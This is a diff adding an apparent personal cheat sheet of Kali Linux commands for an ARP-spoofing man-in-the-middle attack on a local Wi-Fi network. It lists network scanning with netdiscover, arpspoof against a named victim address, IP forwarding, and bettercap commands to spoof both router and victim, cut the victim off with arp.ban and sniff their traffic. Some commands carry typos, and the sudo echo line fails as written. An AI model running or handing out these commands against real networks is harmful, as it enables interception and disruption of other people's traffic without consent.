@@ -1,0 +1,32 @@
+arp -a
+#to see the arp table on windows
+
+netdiscovr r 192.168.0.1/24
+#scan all the ip addresses within the range.
+
+sudo arpspoof -i wlan0 -t 192.168.0.2 192.168.0.141
+#to manually arpspoof with kali.
+
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+#enabling ip_forwarding in kali so the target doesn't lose its connection.
+
+sudo bettercap -iface wlan0
+#start bettercap on wlan0 inteface
+
+inside bettercap:
+    net.probe on
+    #starts observing th enetwork like netdiscover
+    net.show
+    #show a neat arp table
+    set arp.spoof.fullduplex on 
+    #This spoofs both the router and the victim's machine
+    set arp.target 192.168.0.141
+    #setting the victim's ip address
+    arp.spoof on 
+    #Starts spoofing
+    arp.ban on
+    #starts a deathenticate-like attack.
+    net.sniff on
+    #starts sniffing the traffick
+    net.recon on
+    #starts sniffing new hosts of the network
